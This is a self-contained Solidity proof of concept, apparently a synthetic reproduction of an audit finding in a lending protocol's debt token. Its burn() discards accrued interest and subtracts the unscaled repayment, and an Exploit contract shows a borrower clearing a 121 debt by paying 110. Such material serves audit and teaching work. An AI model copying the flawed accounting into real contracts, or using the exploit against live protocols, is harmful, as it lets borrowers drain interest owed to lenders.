// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* RAAC DebtToken — repayment does not scale with the usage index (CodeHawks, AuditVault 57193).
   SYNTHETIC, cheatcode-free. burn() computes balanceIncrease and then assigns amount = amount,
   and _burn subtracts the unscaled repayment. After the index moves from 1.0 to 1.1, a
   repayment of the original 110 clears a 121 debt. Lenders are short the 11 of interest. */

library RayMath {
    uint256 internal constant RAY = 1e27;

    function rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b / RAY;
    }

    function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * RAY / b;
    }
}

contract LendingPool {
    uint256 public normalizedDebt = 1e27;

    function getNormalizedDebt() external view returns (uint256) {
        return normalizedDebt;
    }

    function setNormalizedDebt(uint256 index) external {
        normalizedDebt = index;
    }
}

contract DebtToken {
    using RayMath for uint256;

    LendingPool public reservePool;
    mapping(address => uint256) public scaledBalance;
    mapping(address => uint128) internal _indexOf;
    uint256 public scaledSupply;
    address public reserve;

    constructor(LendingPool pool, address _reserve) {
        reservePool = pool;
        reserve = _reserve;
    }

    function balanceOf(address account) public view returns (uint256) {
        return scaledBalance[account].rayMul(reservePool.getNormalizedDebt());
    }

    function totalSupply() public view returns (uint256) {
        return scaledSupply;
    }

    function mint(address to, uint256 amount, uint256 index) external {
        uint256 amountScaled = amount.rayDiv(index);
        scaledBalance[to] += amountScaled;
        scaledSupply += amountScaled;
        _indexOf[to] = uint128(index);
    }

    function burn(address from, uint256 amount, uint256 index)
        external
        returns (uint256, uint256, uint256, uint256)
    {
        if (from == address(0)) revert("InvalidAddress");
        if (amount == 0) {
            return (0, totalSupply(), 0, 0);
        }

        uint256 userBalance = balanceOf(from);
        uint256 balanceIncrease = 0;
        if (_indexOf[from] != 0 && _indexOf[from] < index) {
            uint256 borrowIndex = LendingPool(reservePool).getNormalizedDebt();
            balanceIncrease = userBalance.rayMul(borrowIndex) - userBalance.rayMul(_indexOf[from]); // @> VULN: this interest is computed and then discarded
            amount = amount;
        }

        _indexOf[from] = uint128(index);

        if (amount > userBalance) {
            amount = userBalance;
        }

        uint256 amountScaled = amount.rayDiv(index);

        if (amountScaled == 0) revert("InvalidAmount");

        _burn(from, amount); // burns the unscaled repayment, not amountScaled
        return (amount, totalSupply(), amountScaled, balanceIncrease);
    }

    function _burn(address from, uint256 amount) internal {
        scaledBalance[from] -= amount;
        scaledSupply -= amount;
    }
}

contract Cash {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function pull(address from, address to, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Exploit {
    LendingPool public pool; // nonce 1
    Cash public cash; // nonce 2
    DebtToken public debt; // nonce 3
    address public constant BORROWER = address(uint160(0xB0B0));
    uint256 public constant RAY = 1e27;
    uint256 public debtBefore;
    uint256 public debtAfter;
    uint256 public paid;
    uint256 public shortfall;

    constructor() {
        pool = new LendingPool();
        cash = new Cash();
        debt = new DebtToken(pool, address(this));
    }

    function run() external {
        uint256 principal = 110 ether;
        pool.setNormalizedDebt(RAY);
        debt.mint(BORROWER, principal, RAY);
        pool.setNormalizedDebt(RAY * 11 / 10);
        debtBefore = debt.balanceOf(BORROWER);
        cash.mint(BORROWER, debtBefore);
        (uint256 burned,,,) = debt.burn(BORROWER, principal, RAY * 11 / 10);
        paid = burned;
        cash.pull(BORROWER, address(this), paid);
        debtAfter = debt.balanceOf(BORROWER);
        shortfall = debtBefore - paid;
        require(debtBefore == 121 ether, "debt before");
        require(paid == 110 ether, "cash pulled");
        require(debtAfter == 0, "debt not forgiven");
        require(shortfall == 11 ether, "shortfall");
        require(cash.balanceOf(BORROWER) == 11 ether, "borrower kept interest");
        require(cash.balanceOf(address(this)) == 110 ether, "reserve cash");
    }
}
